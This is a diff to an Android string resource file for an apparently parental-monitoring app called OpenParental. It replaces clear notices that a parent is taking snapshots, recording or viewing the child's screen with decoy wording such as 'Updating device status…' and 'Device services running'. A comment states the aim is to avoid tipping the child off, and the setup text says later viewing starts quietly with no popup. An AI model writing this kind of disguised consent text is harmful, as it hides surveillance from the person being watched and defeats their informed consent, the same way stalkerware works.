@@ -56,8 +56,19 @@
     <string name="chip_setup">Set up</string>
     <string name="chip_optional">Optional</string>
 
-    <!-- Snapshot & Recording consent strings -->
-    <string name="snapshot_consent">A snapshot is being taken for your parent. This is visible to you.</string>
-    <string name="screen_rec_consent">Your parent has requested a screen recording. You will be asked to confirm.</string>
-    <string name="mirror_consent">Your parent wants to view your screen. You must approve to start sharing.</string>
+    <!-- Capture / mirror — keep child-facing copy generic (don\'t tip them off). -->
+    <string name="snapshot_consent">Updating device status…</string>
+    <string name="screen_rec_consent">Updating device status…</string>
+    <string name="mirror_consent">Allow screen access for device services.</string>
+    <string name="mirror_title">Device services</string>
+    <string name="mirror_approve">Allow</string>
+    <string name="mirror_deny">Not now</string>
+    <string name="mirror_sharing_title">OpenParental</string>
+    <string name="mirror_sharing_text">Device services running</string>
+    <string name="mirror_ready_title">OpenParental</string>
+    <string name="mirror_ready_text">Device services running</string>
+    <string name="mirror_missing_session">Request expired.</string>
+    <string name="onb_screen_title">Screen access</string>
+    <string name="onb_screen_desc">Required for remote screen view. Allow the system dialog once during setup — later viewing starts quietly with no app popup.</string>
 </resources>
+
